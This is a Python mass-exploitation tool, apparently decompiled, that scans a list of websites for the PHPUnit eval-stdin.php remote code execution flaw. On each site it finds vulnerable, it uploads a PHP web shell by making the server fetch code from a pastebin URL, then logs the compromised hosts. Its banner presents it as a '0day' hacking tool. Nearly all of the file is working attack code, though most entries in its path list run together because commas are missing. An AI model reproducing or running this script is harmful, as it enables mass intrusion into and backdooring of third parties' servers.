#!/usr/bin/env python3
# uncompyle6 version 3.6.3 (adapted for Python 3)
# Decompiled from: Python 2.7 (62211)
# Converted and patched to run under Python 3 without reducing logic

import re
import sys
import os
import random
import string
import time
import threading
import codecs
import binascii
import base64
import subprocess
import json
import argparse
import warnings

import requests
from time import time as timer
from random import sample as rand
from multiprocessing.dummy import Pool
from platform import system
from pprint import pprint
from colorama import Fore, Style, init
from urllib.parse import urlparse
from queue import Queue

# initialize colorama
init(autoreset=True)

# Bring urllib2-style API into Python 3
import urllib.request as urllib2
import urllib.parse as urlparse_module

# Silence InsecureRequestWarning
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

# Color shortcuts
fr = Fore.RED
fg = Fore.GREEN
fy = Fore.YELLOW
sb = Style.BRIGHT

def urlfix(url):
    """
    Normalize URL:
     - strip trailing slash
     - ensure http:// or https:// prefix
    """
    if url.endswith('/'):
        url = url[:-1]
    if not (url.startswith('http://') or url.startswith('https://')):
        url = 'http://' + url
    return url

def HACKIT(url, payload, shell_path):
    """
    After a successful eval-stdin exploit, try to drop a real
    PHP backdoor and verify its upload.
    """
    cmd1 = '<?php copy("https://pastebin.com/raw/e2j8QvhN", "mar.php"); ?>'
    session = requests.Session()
    headers = {
        'User-Agent': (
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) '
            'AppleWebKit/537.36 (KHTML, like Gecko) '
            'Chrome/39.0.2171.95 Safari/537.36'
        )
    }

    try:
        # trigger copy-backdoor
        resp1 = session.get(payload, headers=headers, data=cmd1, verify=False, timeout=30)
        if resp1:
            # verify upload
            resp2 = session.get(shell_path, headers=headers, verify=False, timeout=30)
            if 'Raiz0WorM' in resp2.text:
                print(f"{fg}{sb} [SWAT-UNIT] ----> SUCCESS UPLOAD [200] : {url}")
                with open('shell____S.txt', 'a') as out:
                    out.write(shell_path + '\n')
            else:
                print(f"{fr}{sb} [NOT VULNERABILITY] [0] -------> {url}")
        else:
            print(f"{fr}{sb} Shell UPLOADING FAILED [0.2] -------> {url}")
    except Exception:
        print(f"{fr}{sb} Site Error !! Trying... [0.2] -------> {url}")

def EXPLOIT(url):
    """
    Attempts eval-stdin.php at various PHPUnit paths.
    On first success, logs vulnerable endpoint and calls HACKIT().
    """
    paths = [
        '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
        '/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php',
        '/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
        '/phpunit/phpunit/Util/PHP/eval-stdin.php',
        '/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
        '/lib/phpunit/phpunit/Util/PHP/eval-stdin.php',
        '/_inc/vendor/stripe/stripe-php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/_staff/cron/php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/_staff/php/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/1board/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/4walls/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/advanced/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/afasio/afasio/backend_Julia/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/albraj/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/advanced/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/albraj/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/all/spotbills/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/all/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/alquimialaravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/api_source/firebase/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'    
        '/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/apps/shopify/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/aptapi/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/assets/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/atoms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/authenticate/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/autoupgrade/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/avastar/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/back/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/bank/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/beatricce/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/beta/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/cag/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/careers/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/config/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/consulation/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/contact/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/core/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/cronlab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/database/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/develop/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/framework/plugins/fb-page-feed/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/html/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/jobs/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/jobs/workspace/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/kontak/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/libraries/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/live/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/local/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/logistics/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/phpmailer/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/phpexcel/spreadsheet/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/phpexcel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/phpunit/phpunit/Util/PHP/eval-stdin.php'
        '/phpunit/src/Util/PHP/eval-stdin.php'
        '/phpunit/Util/PHP/eval-stdin.php'
        '/platform/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/pos/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/pos/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/ppid/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/production/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/production/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/releases/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/site/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/sites/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/vendor/phpunit/phpunit/LICENSE/eval-stdin.php'
        '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php'
        '/vendor/phpunit/src/Util/PHP/eval-stdin.php'
        '/vendor/phpunit/Util/PHP/eval-stdin.php'
        '/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        '/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'

    ]

    headers = {
        'User-Agent': (
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) '
            'AppleWebKit/537.36 (KHTML, like Gecko) '
            'Chrome/39.0.2171.95 Safari/537.36'
        )
    }
    session = requests.Session()

    for path in paths:
        full_payload = url + path
        shell_path = url + path.replace('eval-stdin.php', 'kentu.php')
        cmd = '<?php echo "Raiz0WorM HaCkEr"; ?>'

        try:
            resp = session.get(full_payload, headers=headers, data=cmd, verify=False, timeout=30)
            if 'Raiz0WorM' in resp.text:
                print(f"{fy}{sb} [VULNERABLE SITE] ---->  [100] : {url}")
                with open('ooh___vlun.txt', 'a') as out:
                    out.write(full_payload + '\n')
                HACKIT(url, full_payload, shell_path)
                return
            else:
                print(f"{fr}{sb} [NOT VULNERABILITY] [0] -------> {url}")
        except Exception:
            print(f"{fr}{sb} Shell UPLOADING FAILED [0.2] -------> {url}")

def check(url):
    """
    Normalize and check site status. If up, attempt exploit chain.
    """
    try:
        url = urlfix(url)
        headers = {
            'User-Agent': (
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) '
                'AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/39.0.2171.95 Safari/537.36'
            )
        }
        resp = requests.get(url, headers=headers, verify=False, timeout=30)
        if resp.status_code == 200:
            print(f"{fy}{sb} [SITE IS WORKING LOOKING FOR VULN] ---->  [100] : {url}")
            EXPLOIT(url)
        else:
            print(f"{fr}{sb} SITE IS DOWN... -------> {url}")
    except Exception:
        # silent pass on DNS/timeout/etc.
        pass

def logo():
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    art = """
  [#] Create By ::
      ___                                                    ______        
     / _ \\                                                   |  ___|       
    / /_\\ \\_ __   ___  _ __  _   _ _ __ ___   ___  _   _ ___ | |_ _____  __
    |  _  | '_ \\ / _ \\| '_ \\| | | | '_ ` _ \\ / _ \\| | | / __||  _/ _ \\ \\/ /
    | | | | | | | (_) | | | | |_| | | | | | | (_) | |_| \\__ \\| || (_) >  < 
    \\_| |_/_| |_|\\___/|_| |_|\\__, |_| |_| |_|\\___/ \\__,_|___/\\_| \\___/_/\\_\\ 
                              __/ |
                             |___/ PhpUnit 0day new version v2
    """
    for line in art.splitlines():
        sys.stdout.write(f'\x1b[1;{random.choice(colors)}m{line}{clear}\n')
        time.sleep(0.05)

def Main():
    list_file = input(f"{fr}{sb}\n\t [ALL-PHPUNIT-VULN] List Please !  : ")
    targets = open(list_file, 'r', encoding='utf-8').read().splitlines()
    try:
        pool = Pool(200)
        pool.map(check, targets)
    except Exception:
        pass

if __name__ == '__main__':
    logo()
    Main()
